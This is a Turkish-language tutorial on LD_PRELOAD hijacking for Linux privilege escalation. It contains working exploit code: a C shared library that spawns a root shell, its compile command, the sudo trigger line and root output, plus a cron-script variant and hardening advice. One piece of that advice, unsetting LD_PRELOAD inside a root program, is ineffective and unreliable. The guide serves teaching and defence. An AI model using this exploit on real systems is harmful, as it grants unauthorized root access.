# Linux'ta Ayrıcalık Yükseltme: LD_PRELOAD Hijacking Kapsamlı Rehberi

Bu döküman, Linux sistemlerinde sıkça karşılaşılan bir ayrıcalık yükseltme (Privilege Escalation) tekniği olan `LD_PRELOAD Hijacking` yönteminin mantığını, sömürü adımlarını, farklı senaryolarını ve en önemlisi korunma yollarını detaylı bir şekilde açıklamaktadır.

## 1. Temel Mantık: LD_PRELOAD Nedir ve "Hijacking" Nasıl Çalışır?

### LD_PRELOAD Nedir?

`LD_PRELOAD`, bir Linux programı çalıştırılmadan önce hangi **paylaşımlı kütüphanelerin (.so dosyaları)** belleğe yükleneceğini belirten bir ortam değişkenidir (environment variable).

Normalde bir program (`örneğin /bin/ls`), çalışmak için ihtiyaç duyduğu standart kütüphaneleri (örneğin matematik fonksiyonları için `libm.so` veya temel C fonksiyonları için `libc.so`) sistemin standart yollarından (`/lib`, `/usr/lib` vb.) yükler. Bu işlemi işletim sisteminin **dinamik bağlayıcısı** (`ld.so` veya `ld-linux.so`) yönetir.

`LD_PRELOAD` ise bu standart akışa müdahale eder. Eğer bu değişken ayarlanmışsa, dinamik bağlayıcı, programın kendi ihtiyaç duyduğu kütüphanelerden **önce**, `LD_PRELOAD` içinde belirtilen kütüphaneyi yükler.

### "Hijacking" (Ele Geçirme) Nasıl Olur?

Saldırının temel mantığı, hedef programın güvenerek çağırdığı standart bir fonksiyonu, kendi yazdığımız kötü amaçlı bir fonksiyonla "ezmektir".

1.  **Kötü Amaçlı Kütüphane Oluşturulur:** Saldırgan, standart bir kütüphane fonksiyonuyla (örneğin `printf`, `strcmp`, `geteuid` vb.) **aynı isme ve aynı parametrelere sahip** bir fonksiyon içeren kendi paylaşımlı kütüphanesini (`.so` dosyası) yazar. Bu fonksiyonun içine ise asıl amacını gerçekleştirecek kodu (örneğin bir `root` shell başlatan `system("/bin/bash")` komutu) yerleştirir.

2.  **Araya Girme:** Saldırgan, `LD_PRELOAD` değişkenini kendi kütüphanesinin yolunu gösterecek şekilde ayarlar.

3.  **Tetikleme:** Yüksek yetkili bir program çalıştırıldığında:
    *   Dinamik bağlayıcı, `LD_PRELOAD` nedeniyle ilk olarak bizim kötü amaçlı kütüphanemizi yükler.
    *   Program, standart bir fonksiyonu çağırdığında (örneğin `geteuid()`), dinamik bağlayıcı bu fonksiyonu ilk olarak bizim kütüphanemizde arar.
    *   Fonksiyonu bizim kütüphanemizde bulduğu için standart olan yerine bizim yazdığımız kötü amaçlı kodu çalıştırır.

Böylece programın akışını ele geçirmiş ve kendi kodumuzu çalıştırmış oluruz.

## 2. Ayrıcalık Yükseltme (Privilege Escalation) Nasıl Gerçekleşir?

Bu tekniğin bir ayrıcalık yükseltme aracına dönüşmesi için iki temel bileşene ihtiyaç vardır:

1.  **Yüksek Yetkili Bir Süreç:** `root` gibi yüksek bir yetkiyle çalışan bir program hedef alınmalıdır. Bu genellikle iki şekilde karşımıza çıkar:
    *   **SUID Biti Ayarlı Programlar:** Dosya sahibi `root` olan ve SUID biti ayarlanmış programlar, kim çalıştırırsa çalıştırsın `root` yetkileriyle çalışır.
    *   **`sudo` ile Çalıştırılan Programlar:** Bir kullanıcının `sudo` ile belirli bir komutu `root` olarak çalıştırmasına izin verilmesi.

2.  **Ortam Değişkeninin Korunması:** `LD_PRELOAD` değişkenimizin, normal kullanıcıdan `root` olarak başlayacak olan sürece aktarılması gerekir.
    *   **Varsayılan Durum (Güvenli):** Modern Linux sistemleri, güvenlik nedeniyle SUID'li bir program çalıştırıldığında `LD_PRELOAD` gibi tehlikeli ortam değişkenlerini otomatik olarak **temizler/yok sayar.**
    *   **Zafiyetli Durum (Tehlikeli):** Ancak `sudo`, `/etc/sudoers` dosyasındaki hatalı bir yapılandırma nedeniyle bu değişkenin korunmasına izin verebilir. **Zafiyetin anahtarı genellikle burasıdır.**

## 3. Uygulamalı Senaryo Analizi ve Sömürü (Exploitation)

### Senaryo 1: `sudo` ve `env_keep` Zafiyeti (En Yaygın Senaryo)

Bu, makalede daha önce bahsi geçen ve en sık karşılaşılan senaryodur.

**Durum Tespiti:**
Hedef makinede `sudo -l` komutunu çalıştırarak `sudo` yetkilerimizi kontrol ederiz.

```bash
user@ubuntu:/tmp$ sudo -l
Matching Defaults entries for user on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User user may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/find
```

**Analiz:**
*   `(ALL) NOPASSWD: /usr/bin/find`: `user` kullanıcısı, `/usr/bin/find` komutunu parola girmeden `root` olarak çalıştırabilir.
*   `env_keep+=LD_PRELOAD`: **KRİTİK ZAFİYET!** Bu ayar, `sudo`'nun `LD_PRELOAD` değişkenini temizlememesini, aksine `root` olarak çalışacak sürece aktarmasını söyler.

**Adım Adım Sömürü:**

1.  **Kötü Amaçlı Kütüphaneyi Hazırlama (`exploit.c`)**
    `/tmp` dizininde `exploit.c` adında bir dosya oluşturun:
    ```c
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>

    // Bu __attribute__((constructor)) sayesinde kütüphane yüklendiği anda
    // bu fonksiyon otomatik olarak çalıştırılır.
    void _init() {
        // Güvenlik ve temizlik için ortam değişkenini sıfırlayalım.
        unsetenv("LD_PRELOAD");
        
        // Yetkimizi root (ID=0) olarak ayarlayalım.
        setgid(0);
        setuid(0);
        
        // Root yetkilerinde bir shell başlatalım.
        // -p parametresi, yetkilerin korunmasını sağlar.
        system("/bin/bash -p");
    }
    ```

2.  **Kütüphaneyi Derleme**
    Bu C kodunu paylaşımlı bir kütüphane (`.so`) olarak derleyin:
    ```bash
    gcc -fPIC -shared -o exploit.so exploit.c -nostartfiles
    ```

3.  **Zafiyeti Tetikleme**
    Şimdi, `sudo` ile `find` komutunu çalıştırırken `LD_PRELOAD` ile kendi kütüphanemizi belirtelim:
    ```bash
    sudo LD_PRELOAD=/tmp/exploit.so /usr/bin/find
    ```

4.  **Sonuç**
    Bu komut `find` programını çalıştırmak yerine, doğrudan size bir `root` shell'i verecektir.
    ```bash
    # whoami
    root
    # id
    uid=0(root) gid=0(root) groups=0(root)
    ```

### Senaryo 2: Yanlış İzinlere Sahip Cron Job veya Servisler

Bazı durumlarda `root` olarak çalışan bir `cron job` veya `systemd` servisi, güvenli olmayan bir şekilde başka bir komutu çağırabilir.

**Örnek Senaryo:**
`root` kullanıcısının `cron` tablosunda her dakika çalışan bir script olsun: `/opt/scripts/backup.sh`.

`backup.sh` içeriği:
```bash
#!/bin/bash
# Bu script /home/user/data dizinindeki verileri yedekler.
cd /home/user/data
/usr/bin/tar -czf /var/backups/backup.tar.gz .
```

*   **Zafiyet:** `backup.sh` scripti `tar` komutunu çalıştırıyor. Eğer saldırgan, bu scriptin çalıştığı ortamı (environment) bir şekilde manipüle edebiliyorsa `LD_PRELOAD` enjekte edebilir. Bu genellikle scriptin kendisinin veya çağırdığı bir dosyanın normal kullanıcı tarafından düzenlenebilmesiyle mümkün olur.

**Sömürü:**
Eğer `backup.sh` scripti üzerinde yazma iznimiz varsa, scripti şöyle değiştirebiliriz:
```bash
#!/bin/bash
# Kötü amaçlı kod eklendi
export LD_PRELOAD=/tmp/exploit.so
/usr/bin/tar -czf /var/backups/backup.tar.gz .
```
Bir sonraki `cron` çalışmasında, `tar` komutu çalışmadan önce bizim `exploit.so` kütüphanemiz `root` yetkileriyle yüklenecek ve bize bir `root` shell'i (veya reverse shell) verecektir.

## 4. Korunma Yöntemleri (Mitigation)

Bu güçlü saldırı tekniğinden korunmak için sistem sıkılaştırması (hardening) kritik öneme sahiptir.

1.  **`sudo` Yapılandırmasını Güçlendirmek (En Önemli Adım)**
    Her zaman `visudo` komutunu kullanarak `/etc/sudoers` dosyasını düzenleyin.
    *   **`env_reset` Kullanın:** `Defaults env_reset` satırının aktif olduğundan emin olun. Bu, `sudo`'nun çoğu ortam değişkenini sıfırlamasını sağlar.
    *   **`env_keep`'i Kontrol Edin:** `Defaults env_keep` listesinden `LD_PRELOAD`, `LD_LIBRARY_PATH` gibi tehlikeli değişkenleri **kaldırın**. Güvenli bir yapılandırmada bu değişkenler bulunmamalıdır.
    *   **`secure_path` Kullanın:** `Defaults secure_path` direktifinin tanımlı olması, saldırganın `PATH` manipülasyonu yapmasını engeller.

2.  **En Az Yetki Prensibi (Principle of Least Privilege)**
    Kullanıcılara `(ALL) ALL` gibi genel yetkiler vermek yerine, sadece işleri için gerekli olan spesifik komutları (`/usr/bin/systemctl restart apache2` gibi) çalıştırma izni verin.

3.  **Dosya Sistemi Sıkılaştırması**
    Saldırganın kötü amaçlı kütüphanesini yükleyebileceği `/tmp` gibi genel yazma alanlarını güvenli hale getirin. `/etc/fstab` dosyasını düzenleyerek bu dizinleri `noexec` seçeneği ile bağlayın.
    ```
    # /etc/fstab örneği
    tmpfs /tmp tmpfs defaults,rw,nosuid,nodev,noexec,relatime 0 0
    ```
    `noexec` seçeneği, o dizin içindeki dosyaların çalıştırılabilir kod olarak (kütüphaneler dahil) yüklenmesini engeller.

4.  **Güvenli Kodlama ve Scripting**
    `root` olarak çalışan scriptler veya programlar yazıyorsanız, programın başında `unsetenv("LD_PRELOAD")` gibi komutlarla tehlikeli ortam değişkenlerini manuel olarak temizleyin.

5.  **Düzenli Sistem Denetimi**
    Sisteminizdeki SUID/SGID dosyalarını, `sudo` kurallarını ve `cron` görevlerini düzenli olarak gözden geçirin. `linpeas.sh` gibi otomatik araçlar bu tür yanlış yapılandırmaları bulmanıza yardımcı olabilir.
